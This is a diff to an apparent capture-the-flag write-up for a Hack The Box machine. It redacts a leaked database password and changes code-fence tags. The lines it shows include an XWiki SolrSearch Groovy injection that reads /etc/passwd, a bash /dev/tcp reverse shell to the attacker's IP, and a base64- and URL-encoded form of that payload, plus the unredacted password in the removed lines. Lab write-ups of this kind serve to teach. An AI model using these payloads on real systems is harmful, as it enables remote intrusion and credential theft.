@@ -2,7 +2,7 @@ Let's scan the car
 ```bash
 sudo nmap -v -sC -sV 10.10.11.80 -oN nmap/initial
 ```
-```http
+```
 PORT STATE SERVICE VERSION
 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -64,7 +64,7 @@ Here's what sent:
 }}}{{async async=false}}{{groovy}}println("cat /etc/passwd".execute().text){{/groovy}}{{/async}}
 ```
 Let's try to follow the link
-```http
+```
 http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d% 7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
 ```
 
@@ -80,7 +80,7 @@ Now you need to run the command
 bash -c 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1'
 ```
 to get a reverse shell. For this purpose in
-```http
+```
 http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d% 7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
 ```
 change `println(%22cat%20/etc/passwd%22.execute().text)` to `"bash -c 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1'"`. To do this, you need to encode this command in `Base64`:
@@ -98,7 +98,7 @@ The final command looks like this:
 }}}{{async async=false}}{{groovy}}"bash -c {echo,YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTc3LzQ0NDQgMD4mMSc=}|{base64,-d}|{bash,-i}".execute(){{/groovy}}{{/async}}'
 ```
 [Let's encode](https://www.urlencoder.org/) it in URL:
-```http
+```
 %7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho%2CYmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTA uMTQuMTc3LzQ0NDQgMD4mMSc%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22.execute%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%27
 ```
 We paste the resulting string into **URL**
@@ -125,14 +125,14 @@ There is a file `hibernate.cfg.xml` in `/usr/lib/xwiki/WEB-INF/`. It contained t
 ```XML
 <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property> 
 	<property name="hibernate.connection.username">xwiki</property> 
-	<property name="hibernate.connection.password">theEd1t0rTeam99</property> 
+	<property name="hibernate.connection.password">th--------am99</property> 
 	<property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property> 
 	<property name="hibernate.dbcp.poolPreparedStatements">true</property> 
 	<property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>
 ```
 There is a password
 ```Password
-theEd1t0rTeam99
+th--------am99
 ```
 Let's try to connect via **SSH** to `oliver`:
 
